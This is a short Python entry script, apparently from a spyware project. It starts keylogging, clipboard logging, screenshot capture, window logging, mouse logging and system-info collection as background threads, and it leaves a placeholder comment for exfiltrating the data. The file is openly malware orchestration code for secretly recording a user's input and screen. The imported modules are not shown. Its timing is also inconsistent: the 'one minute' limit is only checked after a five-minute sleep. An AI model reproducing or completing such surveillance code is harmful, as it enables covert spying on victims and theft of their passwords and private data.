# Main function to call all files simultaneously using threading

from modules import Keylogger, Clipboard_logger, Mac_OS, Screenshotter, System_info, mouse_logger
import threading
import time

def main():
    System_info.capture_system_info()

    threading.Thread(target=Keylogger.start_logging, daemon=True).start()
    threading.Thread(target=Clipboard_logger.start_clipboard_logger, daemon=True).start()
    threading.Thread(target=Screenshotter.start_screenshot_loop, daemon=True).start()
    threading.Thread(target=Mac_OS.start_window_logger, daemon=True).start()
    threading.Thread(target=mouse_logger.start_mouse_logger, daemon=True).start()


    start_time = time.time()

    while True:
        if time.time() - start_time > 60:  # 1 minute
            print("[*] Time limit reached. Exiting.")
            break
        time.sleep(300)  # Placeholder for exfil

if __name__ == "__main__":
    main()

